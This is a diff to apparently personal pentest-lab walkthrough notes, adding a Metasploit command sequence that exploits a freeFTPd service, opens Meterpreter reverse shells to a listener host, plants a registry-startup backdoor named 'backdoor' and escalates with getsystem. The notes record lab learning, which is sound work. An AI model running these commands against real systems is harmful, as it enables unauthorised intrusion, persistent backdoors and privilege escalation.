@@ -66,6 +66,30 @@ Hey Hai, This is just a walkthrough and kinda recap of what in learnt during my 
 - -t flag -> the one who is posting data to some ip[r]
 - we will be on the same network as the target and the web server
 - wireshark -> file -> export -> smb2
+#### Metasploit
+- use exploit/windows/ftp/freeftpd_pass
+- set ftpuser anonymous
+- set rhosts 192.168.99.12
+- set rport 21
+- set payload windows/meterpreter/reverse_tcp
+- set exitfunc process
+- set lhost 192.168.99.100
+- set lport 4444
+- use exploit/windows/local/persistence
+- set reg_name backdoor
+- set exe_name backdoor
+- set startup SYSTEM
+- set session 1
+- set payload windows/meterpreter/reverse_tcp
+- set exitfunc process
+- set lhost 192.168.99.100
+- set lport 5555
+- set DisablePayloadHandler false
+- exploit -j
+- search -f congrats.txt
+- getsystem
+- getuid
+
 ### The Black Box Walkthrough's : Box 1
 
 #### Machine 1
